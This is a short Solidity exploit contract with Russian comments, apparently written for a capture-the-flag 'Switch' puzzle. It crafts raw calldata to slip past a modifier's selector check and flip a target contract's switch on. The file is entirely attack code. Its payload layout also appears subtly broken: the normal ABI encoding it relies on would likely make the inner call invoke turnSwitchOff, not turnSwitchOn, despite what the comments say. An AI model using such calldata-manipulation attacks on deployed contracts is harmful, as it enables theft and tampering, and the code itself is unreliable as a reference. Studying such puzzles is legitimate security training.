// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISwitch {
    function flipSwitch(bytes memory _data) external;

    function switchOn() external view returns (bool);
}

contract SwitchExploitSimple {
    function attack(address target) external {
        ISwitch switchContract = ISwitch(target);

        // Селекторы функций
        bytes4 turnSwitchOffSelector = bytes4(keccak256("turnSwitchOff()"));
        bytes4 turnSwitchOnSelector = bytes4(keccak256("turnSwitchOn()"));

        // Создаем хитрый payload для обхода проверки
        bytes memory payload = abi.encodePacked(
            turnSwitchOffSelector, // Селектор на позиции 0, который будет проверен модификатором
            bytes28(0), // Заполнение до нужной позиции
            uint32(4), // Длина реальных данных (4 байта)
            turnSwitchOnSelector // Реальный вызов turnSwitchOn()
        );

        // Вызываем уязвимую функцию
        switchContract.flipSwitch(payload);

        // Проверяем результат
        bool result = switchContract.switchOn();
        require(result, "Attack failed");
    }
}
